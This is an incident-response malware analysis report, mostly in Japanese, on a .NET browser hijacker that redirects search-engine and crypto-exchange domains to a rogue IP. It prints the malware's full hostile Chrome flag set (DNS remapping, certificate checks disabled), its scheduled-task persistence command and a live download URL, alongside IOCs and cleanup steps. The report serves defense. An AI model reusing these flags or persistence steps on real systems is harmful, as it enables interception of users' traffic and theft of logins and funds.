# Malware Analysis Report: random.exe (Browser Hijacker / Crypto Phishing)

**Date:** 2026-03-12
**Analyst:** Claude Code (Ghidra Headless + r2)

## Target

| Property | Value |
|---|---|
| File | `random.exe` |
| Original Name | `DownloaderApp.exe` |
| SHA256 | `e0e2d1cd33fef3594051992c8b37bf1cfa94c642594caf1d54a4026396d14632` |
| MD5 | `d2c04f408d12a67b5d8990e6021c3d05` |
| Size | 190,464 bytes |
| Format | PE32 (.NET Framework 4.7.2) |
| Packer | UPX |
| PDB | `C:\10\boot\Downloader_no_def\DownloaderApp\DownloaderApp\obj\Release\DownloaderApp.pdb` |
| Copyright | 2025 |

## Source

- Download URL: `http://158.94.211.222/random.exe`
- Quarantine Path: `tools/proxy-web/Quarantine/158.94.211.222/20260312_010956/random.exe.enc.gz`

## Analysis Performed

- [x] info
- [x] imports
- [x] strings (Ghidra失敗 → r2で補完)
- [x] functions
- [x] xrefs
- [x] decompile (Ghidra .NETデコンパイラ非対応 → r2メタデータで補完)
- [x] YARA scan (739ルール、マッチなし)
- [x] CAPA analysis (26 capabilities検出)

## Key Findings — Research Detail

### マルウェア種別

**Browser Hijacker / Crypto Phishing Tool**

DNS再マッピングにより、仮想通貨取引所・検索エンジンの通信を攻撃者サーバーに誘導するブラウザハイジャッカー。Chrome/Edge/Operaのショートカットを書き換え、スケジュールタスクで永続化する。

### 攻撃フロー

```
1. ブラウザプロセス強制終了 (Chrome/Edge/Opera)
2. 既存ショートカット(.lnk)を .old にリネーム → Tempへ退避
3. 悪意あるコマンドライン引数付きの偽ショートカットを作成
4. スケジュールタスクで2分間隔の永続化
5. ブラウザ起動時、全対象ドメインが攻撃者IP 192.177.26.199 に解決
```

### C2 / Rogue Infrastructure

| IOC | Value |
|---|---|
| **Rogue IP** | **`192.177.26.199`** |
| Download Source | `158.94.211.222` |

### DNS再マッピング対象ドメイン（仮想通貨取引所 + 検索エンジン）

| ドメイン | カテゴリ |
|---|---|
| `*google.com` | 検索エンジン |
| `*bing.com` | 検索エンジン |
| `*microsoft.com` | テック |
| `*live.com` | テック |
| `*binance.com` | 仮想通貨取引所 |
| `*coinbase.com` | 仮想通貨取引所 |
| `*crypto.com` | 仮想通貨取引所 |
| `*kraken.com` | 仮想通貨取引所 |
| `*blockchain.com` | 仮想通貨取引所 |
| `*okx.com` | 仮想通貨取引所 |

### ブラウザ起動時の悪意あるフラグ

```
--host-resolver-rules="MAP *google.com 192.177.26.199, MAP *binance.com 192.177.26.199, ..."
--disable-web-security
--disable-features=AsyncDNS,DnsOverHttpsSvcb,EncryptedClientHello,SecureDns,HttpsUpgrades,AutomaticHttps,Http3
--disable-quic
--no-proxy-server
--ignore-certificate-errors
--ignore-ssl-errors
--allow-running-insecure-content
--user-data-dir="<Temp>\chrome_new"
```

**User-Agent偽装:** `Navermind/1.0 (Custom Bot)`
**強制ランディングページ:** `https://google.com`

### 永続化メカニズム

#### 1. ショートカット書き換え（T1547.009）

対象パス:
- `\Microsoft\Windows\Start Menu\Programs\`
- `\Microsoft\Internet Explorer\Quick Launch\`
- `\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\`

パターン: `*chrome*.lnk`, `*edge*.lnk`, `*opera*.lnk`
手法: 既存を`.old`リネーム → COM (`WScript.Shell`) で悪意ある引数付きショートカット作成

#### 2. スケジュールタスク（T1053.005）

- **実行間隔:** 2分 (`PT2M`)
- **WakeToRun:** true
- **AllowHardTerminate:** false
- コマンド: `cmd.exe /c schtasks /create /tn "<NAME>" /xml "<XMLPATH>" /f`

偽装タスク名:
- `WindowsSystemMaintenance`
- `MicrosoftSystemMonitor`
- `WindowsUpdateAssistant`
- `SystemPerformanceMonitor`
- `WindowsSecurityScanner`
- `MicrosoftServiceHost`
- `SystemConfigurationManager`
- `WindowsDiagnosticTool`
- `MicrosoftRuntimeService`
- `SystemHealthMonitor`

#### 3. 自己コピー（偽装ファイル名）

- `runtimehost.exe`, `systemhelper.exe`, `windowsruntime.exe`
- `hostprovider.exe`, `servicehelper.exe`, `taskmanager.exe`
- `systemruntime.exe`, `windowsservice.exe`, `hostmanager.exe`
- `runtimeprovider.exe`

### ブラウザパス解決

レジストリキー検索:
- `ChromeHTML\shell\open\command`
- `MSEdgeHTM\shell\open\command`
- `OperaStable\shell\open\command`
- `Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe`
- `Software\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe`
- `Software\Microsoft\Windows\CurrentVersion\App Paths\opera.exe`
- `WOW6432Node` バリアント + `Program Files` パス

### .NETメタデータ

| Property | Value |
|---|---|
| Namespace | `JYVO89EOBQi7.An6fw.1j7ou` (難読化) |
| Import DLLs | ADVAPI32, GDI32, gdiplus, KERNEL32, ole32, SHELL32, USER32, WININET, WS2_32, mscoree |

### ATT&CK マッピング

| Technique | Name | Evidence |
|---|---|---|
| **T1547.009** | Boot/Logon Autostart: Shortcut Modification | ブラウザショートカット書き換え |
| **T1053.005** | Scheduled Task/Job: Scheduled Task | 2分間隔タスク登録 |
| **T1036.005** | Masquerading: Match Legitimate Name | 偽装タスク名・ファイル名 |
| **T1557** | Adversary-in-the-Middle | DNS再マッピングによるMitM |
| **T1185** | Browser Session Hijacking | セキュリティ機能無効化 + プロファイル隔離 |
| T1057 | Process Discovery | ブラウザプロセス検索 |
| T1489 | Service Stop | ブラウザプロセス強制終了 |
| T1012 | Query Registry | ブラウザインストールパス検索 |
| T1083 | File and Directory Discovery | ショートカットファイル検索 |
| T1222 | File/Directory Permissions Modification | CAPA検出 |

### YARA Scan

739ルール中マッチなし。既知ファミリに該当しないカスタム検体。

### CAPA Summary (26 capabilities)

主要capability:
- `persist via lnk shortcut`
- `schedule task via schtasks`
- `terminate process by name in .NET`
- `contains PDB path`
- `create process on Windows`
- `write and execute a file`

## IR Summary

### IOC一覧（コピペ用）

```
# Network IOC
192.177.26.199          # Rogue DNS target (MitM server)
158.94.211.222          # Malware distribution server

# File Hash
SHA256: e0e2d1cd33fef3594051992c8b37bf1cfa94c642594caf1d54a4026396d14632
MD5:    d2c04f408d12a67b5d8990e6021c3d05

# Scheduled Task Names
WindowsSystemMaintenance
MicrosoftSystemMonitor
WindowsUpdateAssistant
SystemPerformanceMonitor
WindowsSecurityScanner
MicrosoftServiceHost
SystemConfigurationManager
WindowsDiagnosticTool
MicrosoftRuntimeService
SystemHealthMonitor

# Persistence File Names
runtimehost.exe
systemhelper.exe
windowsruntime.exe
hostprovider.exe
servicehelper.exe
taskmanager.exe
systemruntime.exe
windowsservice.exe
hostmanager.exe
runtimeprovider.exe
```

### 推奨対応

- [ ] `192.177.26.199` をFW/Proxyでブロック
- [ ] `158.94.211.222` をFW/Proxyでブロック
- [ ] 上記スケジュールタスク名を検索・削除
- [ ] 上記偽装ファイル名のプロセス停止・ファイル削除
- [ ] ブラウザショートカットの復元（`.old` → 元の名前にリネーム）
- [ ] `%TEMP%\chrome_new` プロファイルディレクトリの削除
- [ ] エンドポイントでSHA256ハッシュによるハンティング

## Notes

- Ghidraの.NETデコンパイラが動作せず（コンテナアーキテクチャ不一致）、r2で.NETメタデータ・文字列を補完
- UPXパック済みだがGhidra/r2は展開後のILを解析可能
- より詳細な.NET解析にはdnSpy/ILSpyでの解析を推奨
